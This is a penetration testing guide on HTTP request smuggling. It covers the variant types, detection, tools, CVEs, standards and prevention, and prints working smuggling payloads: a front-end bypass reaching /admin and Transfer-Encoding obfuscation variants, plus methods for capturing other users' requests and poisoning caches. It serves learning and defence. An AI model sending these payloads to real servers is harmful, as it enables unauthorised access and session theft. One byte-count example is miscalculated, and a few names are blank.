# HTTP Request Smuggling - Complete Penetration Testing Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Vulnerability Types](#vulnerability-types)
3. [Attack Techniques and Methodology](#attack-techniques-and-methodology)
4. [Tools and Frameworks](#tools-and-frameworks)
5. [OWASP Guidelines](#owasp-guidelines)
6. [CVE Examples and Real-World Exploitation](#cve-examples-and-real-world-exploitation)
7. [Industry Standards](#industry-standards)
8. [Research Papers and Technical Articles](#research-papers-and-technical-articles)
9. [Secure Coding and Prevention](#secure-coding-and-prevention)
10. [References](#references)

---

## Introduction

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities arise when the front-end server and back-end server use different mechanisms for determining the boundaries between requests.

### Core Concepts

**Attack Mechanism:**
The vulnerability exploits disagreements between front-end and back-end servers about request boundaries. When these servers are chained together and interpret request delimiters differently, attackers can prepend malicious data to subsequent requests.

**Vulnerability Types:**
- **CL.TE**: Front-end uses Content-Length; back-end uses Transfer-Encoding
- **TE.CL**: Front-end uses Transfer-Encoding; back-end uses Content-Length
- **TE.TE**: Both support Transfer-Encoding, but one ignores obfuscated versions
- **H2.CL**: HTTP/2 front-end downgrades to HTTP/1.1 with Content-Length confusion
- **H2.TE**: HTTP/2 downgrading with Transfer-Encoding issues
- **CL.0**: Server ignores Content-Length header entirely

**Root Cause:**
The HTTP/1.1 specification offers two methods for specifying message length (Content-Length and Transfer-Encoding headers), creating potential conflicts when servers prioritize them differently.

---

## Vulnerability Types

### Summary

| Type | Front-End | Back-End | Key Technique |
|------|-----------|----------|---------------|
| CL.TE | Content-Length | Transfer-Encoding | CL takes priority at front, TE at back |
| TE.CL | Transfer-Encoding | Content-Length | TE takes priority at front, CL at back |
| TE.TE | Transfer-Encoding | Transfer-Encoding | One server ignores obfuscated TE header |
| H2.CL | HTTP/2 (downgrade) | Content-Length | HTTP/2 downgrade with CL confusion |
| H2.TE | HTTP/2 (downgrade) | Transfer-Encoding | HTTP/2 downgrade with TE injection |
| CL.0 | Content-Length | Ignores CL | Back-end ignores Content-Length entirely |

### Basic CL.TE

**Mechanism:** Front-end uses Content-Length; back-end uses Transfer-Encoding.

**Payload (send twice):**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
Second response shows "Unrecognized method GPOST" — confirms vulnerability.

---

### Basic TE.CL

**Mechanism:** Front-end uses Transfer-Encoding; back-end uses Content-Length.

**Payload:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

---

### TE.TE (Header Obfuscation)

**Mechanism:** Both servers support TE but one ignores obfuscated variants.

**Obfuscation examples:**
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-encoding: identity
Transfer-encoding: chunked
```
Try each variant to find which server ignores it.

---

### HTTP/2 Downgrade (H2.CL / H2.TE)

**Mechanism:** HTTP/2 front-end downgrades to HTTP/1.1 with incorrect header handling.

**H2.CL — inject Content-Length in HTTP/2:**
Use Burp Repeater with HTTP/2 + Inspector to inject raw header:
```
:method POST
:path /
content-length: 0
```
Then add smuggled request in the body.

**H2 Request Tunnelling (CRLF injection in header name):**
```
foo: bar
Transfer-Encoding: chunked
```

---

### CL.0 (Back-End Ignores Content-Length)

**Mechanism:** Back-end treats all requests as having no body regardless of Content-Length.

**Detection:** Send request with Content-Length pointing to a 404 path — if second request gets 404, CL.0 confirmed.

---

### Bypass Front-End Security Controls

**Goal:** Access restricted endpoints (e.g., ) by smuggling requests that bypass front-end checks.

**CL.TE example:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

---

### Capture User Requests

**Goal:** Steal credentials, session tokens, or other sensitive data from other users.

**Technique:** Smuggle a request to an endpoint that stores user input with an oversized Content-Length. The next user's request fills the gap and gets stored.

---

### Response Queue Poisoning (H2.TE)

**Mechanism:** Smuggle a complete HTTP/1.1 request that causes the back-end to respond twice, desynchronizing the response queue.

**Goal:** Steal another user's response (which may contain auth tokens or sensitive data).

---

### Pause-Based (Server-Side Desync / CL.0)

**Mechanism:** Exploit Apache's connection timeout — send partial body and pause 61 seconds. Front-end streams entire body; back-end maintains connection longer.

**Tool:** Burp's "Send with pauses" in Repeater with  set after first headers.

---


## Attack Techniques and Methodology

### Understanding Attack Variants

#### CL.TE (Content-Length / Transfer-Encoding)

**Mechanism:**
- Front-end server uses Content-Length header
- Back-end server uses Transfer-Encoding header
- Both headers placed in same HTTP request
- Front-end uses CL and ignores TE
- Back-end ignores CL and uses TE

**Exploitation:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Impact:**
- Request boundaries interpreted differently by each layer
- "SMUGGLED" text prepended to next user's request
- Can capture credentials, bypass security, poison cache

---

#### TE.CL (Transfer-Encoding / Content-Length)

**Mechanism:**
- Frontend recognizes Transfer-Encoding
- Backend does not use Transfer-Encoding
- Front-end uses TE header and ignores CL header
- Back-end uses CL header and ignores TE header

**Exploitation:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**Impact:**
- Reverse of CL.TE attack
- Exploits opposite parsing behavior
- Same attack capabilities

---

#### TE.TE (Transfer-Encoding / Transfer-Encoding)

**Mechanism:**
- Both servers support Transfer-Encoding
- One server ignores header if syntax is malformed
- Header can be obfuscated (nonstandard whitespace, duplicate headers)
- Makes one server but not the other ignore it

**Obfuscation Techniques:**
```
Transfer-Encoding: chunked
Transfer-encoding: cow

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-encoding: identity
Transfer-encoding: chunked
```

**Impact:**
- More sophisticated attack requiring obfuscation
- Exploits RFC compliance inconsistencies
- Can bypass WAF protections

---

#### H2 Variants (HTTP/2 Downgrade Attacks)

**H2.CL Mechanism:**
- HTTP/2 request downgraded to HTTP/1.1
- Frontend handling HTTP/2 fails to properly sanitize during downgrade
- Content-Length processed incorrectly

**H2.TE Mechanism:**
- Similar to H2.CL but with Transfer-Encoding
- RFC 7540 violations in header handling
- Binary protocol characteristics create translation issues

**H2 Request Tunnelling:**
- CRLF injection in HTTP/2 header names
- Complete HTTP/1.1 requests injected via headers
- Bypasses front-end security entirely

**Impact:**
- Particularly dangerous for modern infrastructures
- Affects systems using HTTP/2 at edge with HTTP/1.1 backends
- Can bypass security controls at HTTP/2 layer

---

### Detection Techniques

#### Time-Based Detection

**Method:**
Send requests that will cause a time delay in the application's responses if a vulnerability is present.

**CL.TE Time-Based Test:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If vulnerable, application hangs for ~10 seconds waiting for more data.

**TE.CL Time-Based Test:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

If vulnerable, application hangs waiting for Content-Length bytes.

---

#### Differential Response Detection

**Method:**
Trigger response differences based on the smuggled HTTP request.

**Example:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Send twice. If second request returns 404, vulnerability confirmed.

---

### Exploitation Patterns

#### Pattern 1: Bypass Front-End Security Controls

**Attack Goal:** Access restricted endpoints by smuggling requests that bypass front-end checks.

**Technique:**
1. Identify restricted resource (e.g., `/admin`)
2. Smuggle request with required headers (e.g., `Host: localhost`)
3. Front-end doesn't see restricted path
4. Back-end processes smuggled request with admin privileges

---

#### Pattern 2: Capture Sensitive Data

**Attack Goal:** Steal credentials, session tokens, or other sensitive data from other users.

**Technique:**
1. Identify endpoint that stores user input
2. Smuggle request with oversized Content-Length
3. Next user's request fills the gap
4. Captured data (including cookies) stored in attacker-controlled location

---

#### Pattern 3: Cache Poisoning

**Attack Goal:** Poison cache with malicious content affecting all users.

**Technique:**
1. Identify cacheable resource
2. Smuggle request causing redirect or error response
3. Malicious response cached under legitimate URL
4. All users receive poisoned response

---

#### Pattern 4: Reflected XSS Amplification

**Attack Goal:** Deliver XSS to other users via smuggled requests.

**Technique:**
1. Identify reflected input (e.g., User-Agent header)
2. Smuggle request with XSS payload in header
3. Next user receives response with XSS
4. XSS executes in victim's browser

---

### Common Pitfalls and Troubleshooting

#### Content-Length Calculation Errors

**Problem:** Manually calculating Content-Length is error-prone.

**Solution:**
- Use HTTP Request Smuggler extension
- Count every character including spaces and CRLF (`\r\n`)
- Remember: CRLF = 2 bytes, not 1

**Example:**
```
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
\r\n
```
Length = 24 (GET) + 2 (\r\n) + 15 (Host) + 2 (\r\n) + 2 (\r\n) = 45 bytes

---

#### Missing CRLF Sequences

**Problem:** Forgetting trailing CRLF sequences causes attacks to fail.

**Solution:**
- Always include `\r\n\r\n` after final chunk
- Use Shift+Return in Burp Inspector to insert CRLF
- Verify in hex view

---

#### Connection Resets

**Problem:** Backend connections reset after certain number of requests.

**Solution:**
- Send 10 normal requests to re-establish clean connection
- Start attack sequence again
- Monitor for connection reset indicators

---

#### Timing Issues

**Problem:** Victim users make intermittent requests.

**Solution:**
- Multiple attack attempts often necessary
- Wait appropriate time between attempts
- Use victim simulator timing information

---

## Tools and Frameworks

### Burp Suite

**Primary Tool:** Burp Suite Professional with extensions

**Key Features:**
- **Burp Repeater:** Request crafting and testing
- **Inspector Panel:** Protocol selection, header manipulation
- **Burp Intruder:** Automated payload testing
- **Turbo Intruder:** Timing attacks and pause-based techniques

**Essential Extension:**
- **HTTP Request Smuggler:** Automated detection and exploitation
  - Repository: https://github.com//http-request-smuggler
  - Features: CL.TE, TE.CL, TE.TE, H2 downgrade detection

---

### Open Source Tools

#### 1. Smuggler (defparam)
**Description:** HTTP Request Smuggling testing tool written in Python 3.

**Features:**
- Multiple payload support
- Domain scanning capabilities
- CL.TE and TE.CL detection

**Repository:** https://github.com/defparam/smuggler

**Usage:**
```bash
python3 smuggler.py -u https://target.com
```

---

#### 2. http2smugl
**Description:** HTTP/2 request smuggling security testing tool.

**Features:**
- HTTP/2 specific testing
- Downgrade vulnerability detection
- Infrastructure validation

**Usage:**
Designed for AppSec, DevSecOps, and NOC teams to check their infrastructures.

---

#### 3. smuggles (danielthatcher)
**Description:** HTTP request smuggling scanner designed to work at scale.

**Features:**
- Scale-optimized design (thousands of hosts)
- CL.TE detection using time-based techniques
- TE.CL detection using time-based techniques

**Repository:** https://github.com/danielthatcher/smuggles

---

#### 4. request_smuggler (Sh1Yo)
**Description:** HTTP request smuggling vulnerability scanner based on James Kettle's research.

**Repository:** https://github.com/Sh1Yo/request_smuggler

---

#### 5. h2csmuggler
**Description:** HTTP Request Smuggling over HTTP/2 Cleartext (h2c) protocol.

**Use Case:** Testing h2c upgrade mechanisms

---

#### 6. http-desync-guardian (AWS)
**Description:** Tool by AWS to analyze HTTP requests to minimize risks of HTTP Desync attacks.

**Features:**
- Request analysis
- Risk minimization
- AWS-maintained

---

### Commercial Tools

#### Qualys WAS
**Description:** Web Application Scanning with HTTP Request Smuggling detection.

**Reference:** https://blog.qualys.com/product-tech/2020/10/02/detecting-http-request-smuggling-with-qualys-was

#### Tenable WAS
**Description:** Web Application Scanning with HTTP Request Smuggling detection.

**Reference:** https://www.tenable.com/plugins/was/114223

---

### Curated Resources

#### Awesome-HTTPRequestSmuggling
**Description:** Curated list of awesome blogs and tools about HTTP request smuggling attacks.

**Repository:** https://github.com/chenjj/Awesome-HTTPRequestSmuggling

**Content:**
- Comprehensive tool listings
- Research papers
- Blog posts
- Technical resources

---

## OWASP Guidelines

### Detection Methods

#### Automated Detection Tools
- **OWASP ZAP:** Can assist in automating detection of header mismatches
- **HTTP Request Smuggler:** Burp Suite extension for detecting parsing discrepancies

#### Time-Based Detection
The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present.

**Detection Mechanism:**
- For CL.TE variants, front-end uses Content-Length, forwards only part
- Back-end uses Transfer-Encoding, processes first chunk and waits
- Causes significant time delay indicating vulnerability

#### Differential Response Detection
Trigger response differences based on smuggled HTTP request.

**Confirmation Method:**
- Send "attack" request designed to interfere with next request
- If response contains expected interference, vulnerability confirmed
- Successful smuggler requests invalidate valid requests
- Endpoint returns 400 Bad Request with server-specific fingerprints

---

### Prevention and Remediation Strategies

#### Primary Recommendations

**1. Use HTTP/2 End-to-End**
- HTTP/2 uses robust mechanism for determining request length
- When used end to end, inherently protected against request smuggling
- Disable HTTP downgrading if possible

**2. Header Handling**
- Prioritize Transfer-Encoding header over Content-Length
- Prevent having both headers at same time
- Reject headers with unusual formats or unexpected variations
- Reject multiple Transfer-Encoding values
- Reject non-standard spelling of 'chunked'

**3. Connection Management**
- Back-end connections should not be reused
- Each back-end request should be made over distinct network connection
- Use HTTP/2 for back-end connections to eliminate ambiguity

**4. Server Consistency**
- Use same web server software for front-end and back-end servers
- Ensure servers agree on request bounds
- Harmonize technology stack to avoid parsing differences

**5. Input Validation**
- Validate all inputs for content and length
- Ensure malicious requests cannot be smuggled
- Implement strict HTTP parsing procedures

**6. Security Monitoring**
- Deploy WAFs with rules watching for strange traffic or odd headers
- Use intrusion detection tools to monitor unusual patterns
- Implement logging to catch out-of-sync requests

---

## CVE Examples and Real-World Exploitation

### Recent CVEs (2025)

#### CVE-2025-32094: Akamai HTTP Request Smuggling
**Details:**
- Discovered: March 2025
- Affected: Akamai platform
- Mechanism: HTTP/1.x OPTIONS request with Expect: 100-continue using obsolete line folding
- Impact: Discrepancy in how two in-path Akamai servers interpreted request
- Status: Quickly resolved platform-wide

**Reference:** https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling

---

#### CVE-2025-55315: .NET/ASP.NET Core Request Smuggling
**Details:**
- Released: October 14, 2025
- Affected: ASP.NET Core
- **CVSS Score: 9.9 out of 10 (Critical)**
- Description: Inconsistent interpretation of HTTP requests in ASP.NET Core
- Attack Vector: Authorized attacker can bypass security features over network
- Mechanism: Variation using Transfer-Encoding and Chunk Extensions

**Reference:** https://andrewlock.net/understanding-the-worst-dotnet-vulnerability-request-smuggling-and-cve-2025-55315/

---

### CVEs from 2023

#### CVE-2023-46747: F5 BIG-IP Request Smuggling
**Details:**
- Affected: F5 BIG-IP systems
- Related to: CVE-2022-26377
- Type: Request smuggling similar to Qlik RCE
- Impact: Allowed compromising F5 BIG-IP systems

**Reference:** https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747/

---

#### CVE-2023-25690: Apache HTTP Server mod_proxy Request Smuggling
**Details:**
- Affected: Apache HTTP Server versions 2.4.0 - 2.4.55
- Component: mod_proxy configurations
- Mechanism: RewriteRule or ProxyPassMatch with non-specific patterns
- Attack: User-supplied request-target data re-inserted into proxied request

**Reference:** https://github.com/dhmosfunk/CVE-2023-25690-POC

---

### CVEs from 2022

#### CVE-2022-32214: Node.js llhttp Parser Request Smuggling
**Details:**
- Affected: Node.js http module
- Component: llhttp parser
- Issue: Does not strictly use CRLF sequence to delimit HTTP requests
- Impact: Leads to HTTP Request Smuggling

---

#### CVE-2022-26377: Apache HTTP Server mod_proxy_ajp
**Details:**
- Affected: Apache HTTP Server 2.4.53 and prior
- Component: mod_proxy_ajp
- Issue: Inconsistent interpretation of HTTP requests
- Impact: Allows attacker to smuggle requests to AJP server

---

### Real-World Impact Examples

#### Session Hijacking via HTTP/2 Downgrading
**Case Study:**
- Mechanism: Vulnerability enabled by HTTP/2 downgrading to HTTP/1.1
- Attack Chain: Response queue desynchronization
- Impact: Captured requests from legitimate users
- Result: Account takeover and sensitive information theft

**Reference:** https://outpost24.com/blog/request-smuggling-http-2-downgrading/

---

#### Cache Poisoning Leading to Mass Compromise
**Scenario:**
- Middleware cache servers targeted
- Faked responses stored on wrong cache entries
- All users received smuggled responses
- Led to credential harvesting at scale

---

### Historical Context

**Timeline:**
- **2005:** First surge following WatchFire's research (11 CVEs)
- **2005-2018:** Decline with mostly <5 CVEs annually
- **2019:** Renaissance with James Kettle's Black Hat presentation
- **2019-Present:** ~79% of all recorded request smuggling CVEs

**Bug Bounty Impact:**
- James Kettle 2019: Over $60,000 in bug bounties
- James Kettle 2025: Over $200,000 in two-week period
- Targets: Akamai, Cloudflare, Netlify, Apache, Varnish, Amazon

---

## Industry Standards

### MITRE Resources

#### CAPEC-33: HTTP Request Smuggling
**Description:** HTTP Request Smuggling documented in CAPEC (Common Attack Pattern Enumeration and Classification).

**Attack Pattern:**
- Request smuggling performed due to multiple interpretation error
- Target: Intermediary or monitor
- Method: Consistency manipulation (Transfer-Encoding and Content-Length headers)

**Reference:** https://capec.mitre.org/data/definitions/33.html

---

#### CWE-444: Inconsistent Interpretation of HTTP Requests
**Official Definition:** "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"

**Description:**
Product acts as intermediary HTTP agent (proxy or firewall) but does not interpret malformed HTTP requests/responses consistently with how messages will be processed by entities at ultimate destination.

**Attack Mechanism:**
Adversary abuses flexibility and discrepancies in parsing and interpretation of HTTP Request messages by different intermediary HTTP agents to split a single HTTP request into multiple unauthorized and malicious HTTP requests.

**Root Cause:**
Usually result of usage of outdated or incompatible HTTP protocol versions in HTTP agents.

**Potential Mitigations:**
- Use web server employing strict HTTP parsing (e.g., Apache)
- Use only SSL communication
- Terminate client session after each request
- Turn all pages to non-cacheable

**References:**
- https://cwe.mitre.org/data/definitions/444.html
- https://www.cvedetails.com/cwe-details/444/

---

### NIST References

#### National Vulnerability Database (NVD)
NIST maintains the NVD which catalogs HTTP request smuggling CVEs:
- https://nvd.nist.gov/vuln/detail/CVE-2020-7658
- https://nvd.nist.gov/vuln/detail/CVE-2024-23452
- https://nvd.nist.gov/vuln/detail/cve-2022-26377

---

### PCI DSS Requirements

**Note:** PCI DSS does not have explicit requirements mentioning "HTTP request smuggling" by name, but relevant requirements cover this vulnerability type.

#### Relevant PCI DSS Requirements

**Requirement 6.3.1: Vulnerability Management**
- Identification and management of vulnerabilities
- Impact on compliance programs

**Requirement 6.4.3: Payment Page Script Protection (v4.0)**
- Designed to prevent e-skimming
- All payment page scripts require authorization and integrity methods
- Effective: April 1, 2025

**Requirement 11.6.1: Tampering Detection (v4.0)**
- Detects tampering or unauthorized changes to payment page
- Must detect changes in HTTP headers and payment page content
- Effective: April 1, 2025

**Requirement 11.3.2: External Vulnerability Scanning**
- Quarterly external scans by Approved Scanning Vendor (ASV)
- Would detect HTTP request smuggling vulnerabilities

---

### RFC Standards and Protocol Analysis

#### Core RFC Violations

**RFC 9112 §2.2 – Message Parsing**
- Explicitly requires proper handling of carriage return characters
- If single CR received without LF: must be rejected or replaced with space
- Must process correctly before further parsing

**RFC 9112 Section 6.3.3: Transfer-Encoding vs Content-Length**
- If message received with both headers: Transfer-Encoding MUST override
- Having two competing indicators creates ambiguity
- **Problem:** Not all intermediaries apply this rule consistently

**RFC 7230 Section 3.3.3: Multiple Content-Length Headers**
- Strictly forbids double Content-Length headers
- If message received with multiple or invalid Content-Length:
  - Server MUST respond with 400 (Bad Request)
  - Close the connection

#### HTTP/2 Downgrade Issues

**RFC 7540 Requirements**
- If frontend handling HTTP/2 fails to remove Transfer-Encoding during downgrade
- Can result in H2.TE HTTP request smuggling flaw

**HTTP/2 Protocol Characteristics:**
- Binary protocol (not text-based like HTTP/1.1)
- Request headers don't have "\r\n" delimiter values
- Can contain newline characters in header names and values
- HTTP/2 → HTTP/1.1 conversions are high-risk areas

---

## Research Papers and Technical Articles

### Foundational Research

#### Original Discovery (2005)
**Title:** "HTTP Request Smuggling"
**Authors:** Chaim Linhart et al.
**Date:** 2005

**Significance:**
- First documented HTTP request smuggling vulnerability
- Established foundational concepts
- Request smuggling has been known since 2005

**Document:** https://trimstray.github.io/assets/pdfs/HTTP-Request-Smuggling.pdf

---

### James Kettle's Black Hat Research Series

#### 1. HTTP Desync Attacks: Smashing into the Cell Next Door (2019)
**Author:** James Kettle, Director of Research at 
**Presented:** Black Hat USA 2019 & DEF CON 2019

**Key Achievements:**
- Explored techniques for remote, unauthenticated attackers to splice requests
- Compromised web infrastructure of numerous commercial and military systems
- Harvested over $60,000 in bug bounties

**Downloads:**
- White Paper: https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door-wp.pdf
- Presentation: https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf

---

#### 2. Browser-Powered Desync Attacks (2022)
**Author:** James Kettle
**Presented:** Black Hat USA 2022

**Key Innovations:**
- Demonstrated turning victim's web browsers into desync delivery platforms
- Combined cross-domain requests with server flaws to poison browser connection pools
- Compromised: Apache, Akamai, Varnish, Amazon, multiple web VPNs

**Downloads:**
- White Paper: https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks-wp.pdf
- Presentation: https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks.pdf

---

#### 3. HTTP/1.1 Must Die: The Desync Endgame (2025)
**Author:** James Kettle
**Presented:** Black Hat USA 2025

**Key Achievements:**
- Introduced several novel classes of HTTP desync attack
- Capable of mass compromise of user credentials
- Exposed tens of millions of websites
- Subverted core infrastructure: Akamai, Cloudflare, Netlify
- Yielded over $200,000 in bug bounties in two-week period

**Downloads:**
- White Paper: https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf
- Presentation: https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-Wednesday.pdf

---

### Academic Publications

#### "Attacking Websites: Detecting and Preventing HTTP Request Smuggling Attacks" (2022)
**Authors:** Huang et al.
**Published:** Security and Communication Networks - Wiley Online Library

**Key Contributions:**
- New attack technique proposed at Black Hat 2019
- Changes structure of Transfer-Encoding in HTTP protocol
- Proposes Flask-based reverse proxy detection method

**Reference:** https://onlinelibrary.wiley.com/doi/10.1155/2022/3121177

---

#### "T-Reqs: HTTP Request Smuggling with Differential Fuzzing" (2021)
**Authors:** Bahruz Jabiyev et al.
**Published:** ACM SIGSAC Conference on Computer and Communications Security (CCS 2021)

**Key Innovations:**
- Differential fuzzing techniques for detecting HTTP request smuggling
- Novel automated detection methodology
- Advanced fuzzing approaches

**References:**
- https://dl.acm.org/doi/10.1145/3460120.3485384
- https://swsprec.com/papers/treqs.pdf

---

### Industry Technical Papers

#### "HTTP Request Smuggling in 2020 – New Variants, New Defenses and New Challenges"
**Author:** Amit Klein
**Presented:** Black Hat USA 2020

**Document:** https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges-wp.pdf

---

## Secure Coding and Prevention

### Prevention Techniques for Developers

#### 1. Protocol Upgrade Strategy

**Primary Recommendation: Use HTTP/2 End-to-End**
- HTTP/2 uses robust mechanism for determining request length
- When used end to end, inherently protected against request smuggling
- Disable HTTP downgrading if possible
- If HTTP downgrading unavoidable, validate rewritten request against HTTP/1.1 specification

---

#### 2. Strict HTTP Parsing

**Implement Strict HTTP Request Parsing**
- Use web servers with strict HTTP parsing enabled by default
- Prevent attackers from exploiting parsing vulnerabilities
- Reject malformed requests early in processing pipeline

**Best Practices:**
- Use Apache with strict parsing procedures
- Configure Nginx with rigorous request validation
- Implement custom middleware for additional validation layers

---

#### 3. Header Handling Best Practices

**Reject Ambiguous Requests**
- Reject ALL ambiguous requests
- Reject requests with both Content-Length AND Transfer-Encoding headers
- Reject requests with multiple Content-Length values
- Reject requests with multiple Transfer-Encoding values
- Reject non-standard 'chunked' encoding spellings

**Transfer-Encoding Priority**
- When both headers present: prioritize Transfer-Encoding over Content-Length
- Better: prevent having both headers at the same time
- Reject headers with unusual formats or unexpected variations

**Content-Length Validation**
- Use content-length headers to ensure correct request length interpretation
- Validate format and value
- Reject multiple or conflicting Content-Length headers

**Transfer-Encoding Guidelines**
- Avoid using chunked encoding unless necessary
- Use fixed-length encoding whenever possible
- If chunked encoding required, validate strictly per RFC specifications

---

#### 4. Connection Management

**Back-end Connection Handling**
- Back-end connections should NOT be reused
- Each back-end request should be made over distinct network connection
- Prevents request boundaries from becoming ambiguous
- Eliminates connection pooling risks

**For Back-end Connections:**
- Use HTTP/2 to eliminate ambiguity about request bounds
- If HTTP/1.1 required, implement strict connection lifecycle management
- Terminate connections after suspicious activity

---

#### 5. Input Validation Approaches

**Comprehensive Input Validation**
- Validate ALL inputs for content and length
- Ensure malicious requests cannot be smuggled into system
- Implement validation at multiple layers:
  - Edge/CDN layer
  - Load balancer layer
  - Web server layer
  - Application layer

**Validation Points:**
- Request method validation
- URI/URL validation
- Header name validation
- Header value validation
- Body size validation
- Character encoding validation

**Rejection Criteria:**
- Requests with unusual whitespace in headers
- Requests with non-standard line endings
- Requests with obsolete line folding
- Requests with control characters in headers
- Requests violating RFC specifications

---

### Configuration Best Practices

#### Server Hardening

**General Principles:**
- Keep servers updated with latest security patches
- Implement strict RFC compliance for HTTP/1.1 specifications
- Deploy defense-in-depth measures
- Regular security assessments

**Web Application Firewall (WAF) Configuration**
- Deploy WAFs configured to detect and block request smuggling attempts
- Enable protocol violation detection
- Configure custom rules for known attack patterns
- Monitor for strange traffic or odd headers

**WAF Rule Examples:**
- Block requests with both Content-Length and Transfer-Encoding
- Block requests with multiple Content-Length headers
- Block requests with obfuscated Transfer-Encoding values
- Block requests with non-standard chunked encoding

---

#### Nginx Configuration Best Practices

**Known Nginx Issues:**
- Nginx ignores headers like "Content-Length: 12 34" (reported as WONTFIX)
- Vulnerabilities with certain error_page configurations
- Risk when fronted by load balancer

**Hardening Recommendations:**
- Validate headers and implement appropriate timeout settings
- Review request handling configurations
- Strictly validate Content-Length and Transfer-Encoding headers
- Keep Nginx updated to latest stable version

---

#### Apache Configuration Best Practices

**Apache Advantages:**
- Employs strict HTTP parsing procedure
- Better default behavior for ambiguous requests

**Hardening Recommendations:**
- Keep Apache updated (CVE-2023-25690 affects versions 2.4.0-2.4.55)
- Review mod_proxy configurations carefully
- Avoid non-specific patterns in RewriteRule or ProxyPassMatch
- Strictly validate Content-Length and Transfer-Encoding headers

---

### Monitoring and Detection

**Security Monitoring Setup**
- Deploy WAFs with traffic monitoring
- Implement intrusion detection systems (IDS)
- Watch for strange traffic patterns
- Monitor for odd or malformed headers

**Logging Best Practices:**
- Log all requests with suspicious header combinations
- Log requests with parsing anomalies
- Catch out-of-sync requests
- Log unusual server behavior
- Implement centralized logging
- Set up alerting for suspicious patterns

**Indicators to Monitor:**
- Requests with both Content-Length and Transfer-Encoding
- Requests with multiple identical headers
- Requests with unusual header formatting
- Unexpected 400 Bad Request responses
- Time delays in request processing
- Response queue desynchronization

---

### Testing and Validation

**Regular Testing Requirements**
- HTTP Request Smuggling detection requires regular testing
- Systematic approach using both tools and manual testing
- Maintain continuous web application security posture

**Testing Methodology:**
1. Automated scanning with tools
2. Manual testing of edge cases
3. Differential response testing
4. Time-based detection testing
5. Test all HTTP processing layers
6. Test front-end/back-end combinations

**Penetration Testing**
- Include request smuggling in penetration test scope
- Test all proxy/load balancer/server combinations
- Test HTTP/2 downgrade scenarios
- Document findings and remediation

---

### Development Lifecycle Integration

**Secure SDLC Practices**
- Security requirements definition phase
- Threat modeling including request smuggling scenarios
- Secure coding training for developers
- Code review focusing on HTTP handling
- Security testing in CI/CD pipeline
- Pre-production security validation

**Code Review Checklist**
- HTTP header handling logic
- Request parsing implementation
- Connection pooling/reuse logic
- Proxy configuration
- Cache implementation
- Input validation routines

---

## References

## Web Security References
- Web Security Academy: https://portswigger.net/web-security/request-smuggling
- Research Hub: https://portswigger.net/research/request-smuggling
- HTTP Request Smuggler Tool: https://github.com//http-request-smuggler

### OWASP Resources
- Testing Guide: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling

### MITRE Resources
- CWE-444: https://cwe.mitre.org/data/definitions/444.html
- CAPEC-33: https://capec.mitre.org/data/definitions/33.html
- CAPEC-273: https://capec.mitre.org/data/definitions/273.html

### Black Hat Presentations
- James Kettle 2019: https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door-wp.pdf
- James Kettle 2022: https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks-wp.pdf
- James Kettle 2025: https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf

### Tools and GitHub Repositories
- Smuggler (defparam): https://github.com/defparam/smuggler
- smuggles (danielthatcher): https://github.com/danielthatcher/smuggles
- request_smuggler (Sh1Yo): https://github.com/Sh1Yo/request_smuggler
- Awesome-HTTPRequestSmuggling: https://github.com/chenjj/Awesome-HTTPRequestSmuggling

### CVE References
- Akamai CVE-2025-32094: https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling
- Andrew Lock CVE-2025-55315: https://andrewlock.net/understanding-the-worst-dotnet-vulnerability-request-smuggling-and-cve-2025-55315/
